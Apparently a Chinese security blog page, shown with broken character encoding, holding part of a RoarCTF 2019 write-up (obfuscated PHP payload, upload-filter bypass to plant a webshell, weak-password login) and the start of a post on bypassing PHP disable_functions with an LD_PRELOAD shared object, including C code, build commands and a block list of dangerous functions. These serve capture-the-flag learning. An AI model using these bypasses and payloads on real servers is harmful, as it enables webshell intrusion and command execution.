<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> (((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;|((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)&amp;(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;|(<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">1</span>&#125;)).((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;&amp;((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;|((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;)&amp;(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;|(<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">1</span>&#125;)).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;|((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))();</span><br></pre></td></tr></table></figure>

<p>æœ€åè¦æ„é€ çš„payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(serIALIze)(FILe(&#x2F;f1agg))</span><br></pre></td></tr></table></figure>

<p>è¿™è¦å­—ç¬¦æ¯”è¾ƒå°‘ï¼Œå¥½æ„é€ ä¸€äº›</p>
<h3 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple_upload"></a>simple_upload</h3><p>è¿™é¢˜åšçš„æœ‰ç‚¹éš¾å—â€¦.ï¼Œç›´æ¥æŠŠæˆ‘å¡æ­»äº†â€¦åé¢çš„é¢˜ä¹Ÿæ²¡æ€ä¹ˆåšäº†â€¦</p>
<p>é¢˜ç›®æºç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">'file'</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">'name'</span>]), <span class="string">".php"</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// å®ä¾‹åŒ–ä¸Šä¼ ç±»</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ å¤§å°</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">'jpg'</span>, <span class="string">'gif'</span>, <span class="string">'png'</span>, <span class="string">'jpeg'</span>);<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ ç±»å‹</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">'./Public/Uploads/'</span>;<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ ç›®å½•</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">''</span>;<span class="comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ å­ç›®å½•</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// ä¸Šä¼ é”™è¯¯æç¤ºé”™è¯¯ä¿¡æ¯</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// ä¸Šä¼ æˆåŠŸ è·å–ä¸Šä¼ æ–‡ä»¶ä¿¡æ¯</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">'file'</span>][<span class="string">'savepath'</span>].$info[<span class="string">'file'</span>][<span class="string">'savename'</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">"url"</span>=&gt;$url,<span class="string">"success"</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå†™äº†ä¸€ä¸ªuploadæ–¹æ³•ï¼Œå…ˆæ˜¯åœ¨é€šè¿‡strstrå¯¹.phpå­—ç¬¦ä¸²è¿›è¡Œäº†è¿‡æ»¤ï¼Œç„¶åè°ƒç”¨Uploadç±»é€šè¿‡tpçš„ä¸Šä¼ æ–¹æ³•è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ã€‚</p>
<p>é¦–å…ˆçœ‹äº†ä¸€ä¸‹åŸºæœ¬çš„ä¸Šä¼ bypassæ“ä½œï¼Œæ²¡ä»€ä¹ˆç”¨ï¼Œå‰é¢åŠ äº†ä¸ªå‰ç¼€ï¼Œhtaccesså’Œ.user.iniè‚¯å®šä¸å¥½ä½¿ï¼Œphtä¹‹ç±»çš„åˆä¸è§£æï¼Œç¡¬ä¸Šä¼ phpçš„è¯è‚¯å®šæ˜¯éœ€è¦.phpçš„ï¼Œä½†æ˜¯è¿™ä¸ªåˆç»™banäº†ï¼Œå°è¯•äº†å¾ˆä¹…ä¹‹åï¼Œæƒ³äº†ä¸€ä¸‹ï¼Œç¡¬ä¸Šä¼ phpæ˜¯è‚¯å®šä¸å¯èƒ½çš„äº†ã€‚</p>
<p>æ¥ç€æƒ³åˆ°äº†pharååºåˆ—åŒ–..å› ä¸ºæ„Ÿè§‰æœ‰getimagesize</p>
<p>PHP: ä¸å¥½æ„æ€ï¼Œç¡®å®æœ‰ï¼Œä½†æ˜¯å’±å¤„ç†çš„æ˜¯tmpfile</p>
<p>â€¦</p>
<p>è¿™ä¸ªå‘ç‚¹æˆ‘åœ¨bytectfå°±æƒ³è¿‡â€¦è‚¯å®šå¤„ç†çš„æ˜¯tmpfileå•Šâ€¦(çœŸæƒ³ç»™è‡ªå·±ä¸€æ‹³</p>
<p>æ¥ç€å°±å¾€Uploadç±»æºç ä¸Šé äº†ï¼Œæ‰“äº†ä¸ªæ–­ç‚¹ï¼Œæƒ³è·Ÿè¿›å»çœ‹çœ‹ï¼Œæ¯”èµ›ç»“æŸå‰å¤©æ™šä¸Šæ²¡å¥½ä½¿â€¦ç»“æŸå€’æ˜¯çªç„¶å¥½ä½¿äº†,çœŸæ˜¯éš¾å—ï¼Œå½“æ˜¯çœ‹çœ‹æºç çš„è¯è¯´ä¸å®šå°±æœ‰çªç ´äº†</p>
<p>æœ€åä¸€å¼ å›¾ç‰‡è§£é‡Šä¸€ä¸‹å§</p>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥åœ¨uploadå¤„æ‰“ä¸€ä¸ªæ–­ç‚¹ï¼Œä¼ ä¸€ä¸ªå›¾ç‰‡è·Ÿè¿›å»çœ‹çœ‹ï¼Œå¾ˆæ¸…æ¥šçš„å¯ä»¥çœ‹åˆ°è¿™é‡Œç”¨strip_tagså»å¤„ç†äº†æ–‡ä»¶åï¼Œæ‰€ä»¥åç¼€ä¸º<code>p&lt;br&gt;hp</code>å°±å¯ä»¥ç»•è¿‡äº†ã€‚</p>
<p><img src="https://s2.ax1x.com/2019/10/14/KpdPTs.png" alt="KpdPTs.png"></p>
<p>æˆåŠŸä¸Šä¼ shellâ€¦,æˆ‘å¤ªéš¾äº†</p>
<p><img src="https://s2.ax1x.com/2019/10/14/KpdmXF.png" alt="KpdmXF.png"></p>
<p>ä¹‹åçœ‹å…¶ä»–å¸ˆå‚…çš„wpäº†è§£äº†æœ‰ç¬¬äºŒç§åšæ³•â€¦æœ‰ç‚¹æ‡µ..ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶ï¼Œæ¯”èµ›çš„æ—¶å€™è¯•è¿‡â€¦å¾ˆè¿·æ²¡æˆåŠŸâ€¦â€¦.</p>
<p><img src="https://s2.ax1x.com/2019/10/18/KZUHdx.png" alt="KZUHdx.png"></p>
<p>ä¹ŸæˆåŠŸä¸Šä¼ äº†..ä¸¤ä¸ªæ–‡ä»¶ï¼Ÿâ€¦æˆ‘è¢«æ¼”äº†å—â€¦</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯çˆ†ç ´æ–‡ä»¶åäº†ï¼Œåœ¨çˆ†ç ´æ–‡ä»¶åçš„æ—¶å€™å…¶å®æœ‰ä¸€ä¸ªå°æŠ€å·§</p>
<p>æ¯”å¦‚ä¸¤ä¸ªæ–‡ä»¶å</p>
<p>5da9614614f1a.php</p>
<p>5da9614617439.png</p>
<p>å°†åå››ä½è½¬åŒ–ä¸º10è¿›åˆ¶ï¼Œå…¶å®ç›¸å·®åªæœ‰ä¸åˆ°10000,æ‰€ä»¥å¾ˆå¿«å°±çˆ†ç ´å‡ºæ¥äº†ï¼Œçˆ†ç ´è„šæœ¬å°±ä¸è´´äº†ã€‚</p>
<p>é€šè¿‡è¿™é“é¢˜è§„é¿äº†è¿™ä¸ªå‘ç‚¹ï¼Œä¸Šä¼ çš„æ—¶å€™ï¼Œgetimagesizeä¹‹ç±»çš„å‡½æ•°è‚¯å®šå»åˆ¤æ–­çš„tmpfileï¼Œæ‰€ä»¥ä¸€å®šä¸å­˜åœ¨pharååºåˆ—åŒ–</p>
<h3 id="Easy-java"><a href="#Easy-java" class="headerlink" title="Easy_java"></a>Easy_java</h3><p>æ²¡æ€ä¹ˆçœ‹è¿‡javaä»¥åŠjavawebâ€¦çœ‹äº†wpæ„Ÿè§‰ä¸æ˜¯å¾ˆéš¾â€¦çœŸæ˜¯å¯æƒœäº†â€¦.ï¼Œå…¶å®ä¸»è¦å°±æ˜¯å¼±å£ä»¤å§â€¦</p>
<p>é€šè¿‡å¼±å£ä»¤admin/admin888è¿›å…¥ï¼Œé€šè¿‡downloadè¿›è¡Œä¸‹è½½ï¼Œä¸è¿‡æ˜¯postç±»å‹çš„</p>
<p><img src="https://s2.ax1x.com/2019/10/18/KemQl8.png" alt="KemQl8.png"></p>
<p>è¯»ä¸€ä¸‹flagæ§åˆ¶å™¨</p>
<p><img src="https://s2.ax1x.com/2019/10/18/KembtI.png" alt="KembtI.png"></p>
<h3 id="Online-proxy"><a href="#Online-proxy" class="headerlink" title="Online-proxy"></a>Online-proxy</h3><p>è¿™é“é¢˜â€¦.ä¸€æ—¶è¯­å¡.jpg</p>
<p>ç«Ÿç„¶å°±æ˜¯ä¸€ä¸ªå¸¸è§„çš„xffæ³¨å…¥â€¦.ï¼Ÿï¼Ÿï¼Ÿï¼Œé€šè¿‡ä¸Šä¸€æ¬¡çš„xffæ³¨å°±è¡Œäº†</p>
<h3 id="dist"><a href="#dist" class="headerlink" title="dist"></a>dist</h3><p>ä¸å¥½æ„æ€ï¼Œæ¯”èµ›çš„æ—¶å€™å‘ç°æ³„éœ²çš„æºç æ˜¯goå°±æ²¡çœ‹äº†ï¼Œä¸ä¼šGoâ€¦(è¿˜æœ‰å¥½å¤šè¦å­¦å•Šorzâ€¦.</p>
<p>è¯´è¯´å‰é¢çš„æ³„éœ²éƒ¨åˆ†çš„å§.</p>
<p>å‰ç«¯æºç æœ‰sourceMapping,çœ‹ä¸€ä¸‹config.js</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ip = window.location.host.split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">var</span> auth = <span class="string">'http://'</span>+ip+<span class="string">':9000/auth'</span>;</span><br><span class="line"><span class="keyword">var</span> api = <span class="string">'http://'</span>+ip+<span class="string">':5001/api'</span>;</span><br><span class="line">export &#123; auth, api &#125;;</span><br><span class="line"><span class="comment">// my source code backup:</span></span><br><span class="line"><span class="comment">// /backup-for-debug.7z</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// WEBPACK FOOTER //</span></span><br><span class="line"><span class="comment">// ./src/config.js</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åç«¯çš„ä»£ç åœ¨backup-for-debug.7zï¼Œä¸‹è½½ä¸‹æ¥å¼€å§‹å®¡è®¡ã€‚</p>
<p>â€¦</p>
<h3 id="phpshe"><a href="#phpshe" class="headerlink" title="phpshe"></a>phpshe</h3><p>å¾…çœ‹</p>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p><strong>å‡†å¤‡å­¦ä¹ Goå’ŒJavaï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</strong></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/20/Roarctf2019/" data-id="ckabsu38h001ukkvreek4eu7h" class="article-share-link" data-share="baidu" data-title="Roarctf2019">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/20/Roarctf2019/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Bypass-disabled-functions-open-basedir-php" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/09/Bypass-disabled-functions-open-basedir-php/" class="article-date">
  <time datetime="2019-10-09T10:19:15.000Z" itemprop="datePublished">2019-10-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/09/Bypass-disabled-functions-open-basedir-php/">Bypass disabled_functions &amp; open_basedir-php</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>å¾ˆå¤šæƒ…å†µä¸‹æˆ‘ä»¬ä¼šé‡åˆ°æ‹¿åˆ°webshellï¼Œå´æ— æ³•æ‹¿åˆ°æˆ‘ä»¬æƒ³è¦æ•°æ®çš„æƒ…å†µï¼Œè¢«æœåŠ¡å™¨æ‰€è®¾ç½®çš„open_basedirå’Œdisabled_functionsæ‰€é™åˆ¶ï¼Œä¸‹é¢å†™çš„å°±æ˜¯ä¸€äº›bypassæ–¹æ³•äº†ã€‚</p>
<h3 id="bypass-disabled-functions"><a href="#bypass-disabled-functions" class="headerlink" title="bypass disabled_functions"></a>bypass disabled_functions</h3><h4 id="å¯»æ‰¾é—æ¼å±é™©å‡½æ•°"><a href="#å¯»æ‰¾é—æ¼å±é™©å‡½æ•°" class="headerlink" title="å¯»æ‰¾é—æ¼å±é™©å‡½æ•°"></a>å¯»æ‰¾é—æ¼å±é™©å‡½æ•°</h4><p>ä¸€èˆ¬è¢«é—æ¼çš„å±é™©å‡½æ•°éƒ½æ˜¯å¦‚popen,proc_open(),pcntl_exec()è¿™æ ·çš„å‡½æ•°ï¼Œæ¯”å¦‚åœ¨å›½å†³Day1çš„web11</p>
<p><a href="https://github.com/imagemlt/CISCN_2019_final_pmarkdown" target="_blank" rel="noopener">https://github.com/imagemlt/CISCN_2019_final_pmarkdown</a></p>
<p>åœ¨disabled_functionså°±å­˜åœ¨æœªè¿‡æ»¤popençš„æƒ…å†µï¼Œè¿™æ ·æœ€åå°±å¯ä»¥ä¸ç”¨å»å¼•å…¥æ¶æ„soäº†</p>
<p>ä¸‹é¢æ˜¯å½“æ—¶disabled_functionsçš„å†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,mail,passthru,exec,system,chroot,chgrp,chown,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,popepassthru,stream_socket_server,fsocket,fsockopen</span><br></pre></td></tr></table></figure>

<h4 id="åˆ©ç”¨LD-PRELOAD"><a href="#åˆ©ç”¨LD-PRELOAD" class="headerlink" title="åˆ©ç”¨LD_PRELOAD"></a>åˆ©ç”¨LD_PRELOAD</h4><h5 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h5><blockquote>
<p>åœ¨UNIXçš„åŠ¨æ€é“¾æ¥åº“çš„ä¸–ç•Œä¸­ï¼ŒLD_PRELOADå°±æ˜¯è¿™æ ·ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒå¯ä»¥å½±å“ç¨‹åºçš„è¿è¡Œæ—¶çš„é“¾æ¥ï¼ˆRuntime linkerï¼‰ï¼Œå®ƒå…è®¸ä½ å®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ã€‚è¿™ä¸ªåŠŸèƒ½ä¸»è¦å°±æ˜¯ç”¨æ¥æœ‰é€‰æ‹©æ€§çš„è½½å…¥ä¸åŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸åŒå‡½æ•°ã€‚é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸»ç¨‹åºå’Œå…¶åŠ¨æ€é“¾æ¥åº“çš„ä¸­é—´åŠ è½½åˆ«çš„åŠ¨æ€é“¾æ¥åº“ï¼Œç”šè‡³è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ã€‚ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤åŠŸèƒ½æ¥ä½¿ç”¨è‡ªå·±çš„æˆ–æ˜¯æ›´å¥½çš„å‡½æ•°ï¼ˆæ— éœ€åˆ«äººçš„æºç ï¼‰ï¼Œè€Œå¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¥å‘åˆ«äººçš„ç¨‹åºæ³¨å…¥æ¶æ„ç¨‹åºï¼Œä»è€Œè¾¾åˆ°é‚£ä¸å¯å‘Šäººçš„ç½ªæ¶çš„ç›®çš„ã€‚</p>
</blockquote>
<p>ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºæœ¬æ¥LD_PRELOADçš„ä½œç”¨æ˜¯åˆ©ç”¨æˆ‘ä»¬åŠ è½½è¿›æ¥çš„soï¼Œå»è¦†ç›–ç›¸åŒå‡½æ•°åçš„åº“å‡½æ•°ï¼Œå»ä½¿ç”¨è‡ªå·±çš„å‡½æ•°ï¼Œæ›´åŠ æ–¹ä¾¿ï¼Œä½†æ˜¯å¦‚æœè‡ªå·±çš„å‡½æ•°ä¸ºæ¶æ„å‡½æ•°ï¼Œå°±é€ æˆäº†æ¶æ„ç¨‹åºæ³¨å…¥ã€‚</p>
<h5 id="åŠ¨æ€é“¾æ¥ä¸é™æ€é“¾æ¥"><a href="#åŠ¨æ€é“¾æ¥ä¸é™æ€é“¾æ¥" class="headerlink" title="åŠ¨æ€é“¾æ¥ä¸é™æ€é“¾æ¥"></a>åŠ¨æ€é“¾æ¥ä¸é™æ€é“¾æ¥</h5><blockquote>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œç¨‹åºçš„é“¾æ¥åˆ†ä¸ºé™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥ï¼Œé™æ€é“¾æ¥å°±æ˜¯æŠŠæ‰€æœ‰æ‰€å¼•ç”¨åˆ°çš„å‡½æ•°æˆ–å˜é‡å…¨éƒ¨åœ°ç¼–è¯‘åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚åŠ¨æ€é“¾æ¥åˆ™ä¸ä¼šæŠŠå‡½æ•°ç¼–è¯‘åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œè€Œæ˜¯åœ¨ç¨‹åºè¿è¡Œæ—¶åŠ¨æ€åœ°è½½å…¥å‡½æ•°åº“ï¼Œä¹Ÿå°±æ˜¯è¿è¡Œé“¾æ¥ã€‚æ‰€ä»¥ï¼Œå¯¹äºåŠ¨æ€é“¾æ¥æ¥è¯´ï¼Œå¿…ç„¶éœ€è¦ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ã€‚åŠ¨æ€é“¾æ¥åº“çš„å¥½å¤„åœ¨äºï¼Œä¸€æ—¦åŠ¨æ€åº“ä¸­çš„å‡½æ•°å‘ç”Ÿå˜åŒ–ï¼Œå¯¹äºå¯æ‰§è¡Œç¨‹åºæ¥è¯´æ˜¯é€æ˜çš„ï¼Œå¯æ‰§è¡Œç¨‹åºæ— éœ€é‡æ–°ç¼–è¯‘ã€‚è¿™å¯¹äºç¨‹åºçš„å‘å¸ƒã€ç»´æŠ¤ã€æ›´æ–°èµ·åˆ°äº†ç§¯æçš„ä½œç”¨ã€‚å¯¹äºé™æ€é“¾æ¥çš„ç¨‹åºæ¥è¯´ï¼Œå‡½æ•°åº“ä¸­ä¸€ä¸ªå°å°çš„æ”¹åŠ¨éœ€è¦æ•´ä¸ªç¨‹åºçš„é‡æ–°ç¼–è¯‘ã€å‘å¸ƒï¼Œå¯¹äºç¨‹åºçš„ç»´æŠ¤äº§ç”Ÿäº†æ¯”è¾ƒå¤§çš„å·¥ä½œé‡ã€‚</p>
<p>æœ‰å¾—å°±æœ‰å¤±ã€‚åŠ¨æ€é“¾æ¥æ‰€å¸¦æ¥çš„åå¤„å’Œå…¶å¥½å¤„ä¸€æ ·åŒæ ·æ˜¯å·¨å¤§çš„ã€‚å› ä¸ºç¨‹åºåœ¨è¿è¡Œæ—¶åŠ¨æ€åŠ è½½å‡½æ•°ï¼Œè¿™ä¹Ÿå°±ä¸ºä»–äººåˆ›é€ äº†å¯ä»¥å½±å“ä½ çš„ä¸»ç¨‹åºçš„æœºä¼šã€‚è¯•æƒ³ï¼Œä¸€æ—¦ï¼Œä½ çš„ç¨‹åºåŠ¨æ€è½½å…¥çš„å‡½æ•°ä¸æ˜¯ä½ è‡ªå·±å†™çš„ï¼Œè€Œæ˜¯è½½å…¥äº†åˆ«äººçš„æœ‰ä¼å›¾çš„ä»£ç ï¼Œé€šè¿‡å‡½æ•°çš„è¿”å›å€¼æ¥æ§åˆ¶ä½ çš„ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œé‚£ä¹ˆï¼Œä½ çš„ç¨‹åºä¹Ÿå°±è¢«äººâ€œåŠ«æŒâ€äº†ã€‚</p>
</blockquote>
<p>å¯ä»¥çœ‹å‡ºè™½ç„¶åŠ¨æ€é“¾æ¥å¢æ·»äº†å¾ˆå¤šæ–¹ä¾¿ï¼Œä½†åŒæ—¶ä¹Ÿå¢åŠ äº†ä¸å°‘é£é™©åº¦ï¼Œæ¯”å¦‚æˆ‘ä»¬å¯ä»¥å¼•å…¥è‡ªå·±çš„soæ–‡ä»¶ï¼Œé‡Œé¢å†™å¥½æˆ‘ä»¬æƒ³è¦çš„æ‰§è¡Œå†…å®¹çš„åº“å‡½æ•°ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´è¦†ç›–äº†åŸæ¥æ­£å¸¸çš„åº“å‡½æ•°ï¼Œé€ æˆå‡½æ•°åŠ«æŒ</p>
<p>å¯¹LD_PRELOADçš„åˆ©ç”¨å¤§æ¦‚å¯åˆ†ä¸ºä¸¤ç§ï¼Œç¬¬ä¸€ç§æ˜¯åŠ«æŒåº“å‡½æ•°ï¼Œç¬¬äºŒç§æ˜¯åŠ«æŒå¯åŠ¨è¿›ç¨‹</p>
<h5 id="åŠ«æŒåº“å‡½æ•°"><a href="#åŠ«æŒåº“å‡½æ•°" class="headerlink" title="åŠ«æŒåº“å‡½æ•°"></a>åŠ«æŒåº“å‡½æ•°</h5><p>ç½‘ä¸Šå¤§å¤šæ•°éƒ½æ˜¯åŠ«æŒçš„getuidï¼Œå…¶å®èƒ½åŠ«æŒçš„å¹¶ä¸åªgetuid,æˆ‘ä»¬éœ€è¦åŠ«æŒçš„å‡½æ•°éœ€è¦æ»¡è¶³ï¼Œæ­¤å‡½æ•°ä¸ºç‚¹ï¼š<strong>ç»å¸¸è¢«ç”¨åˆ°çš„å¹¶ä¸”ä¸ºæ— å‚æ•°çš„å‡½æ•°</strong></p>
<p>æ¯”å¦‚getuid,getpid,getgid,getppidè¿™ç§ï¼Œå…·ä½“çš„å¯ä»¥fuzzä¸€ä¸‹ï¼Œåº”è¯¥è›®å¤šçš„</p>
<p>å…·ä½“æ“ä½œè¿‡ç¨‹(ä»¥geteuidçš„åŠ«æŒä¸ºä¾‹)</p>
<p>hack.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        system(<span class="string">"whoami &gt; hack"</span>);</span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘æˆsoæ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc --share hack -o hack.so</span><br></pre></td></tr></table></figure>

<p>å†™ä¸€ä¸ªhack.php</p>
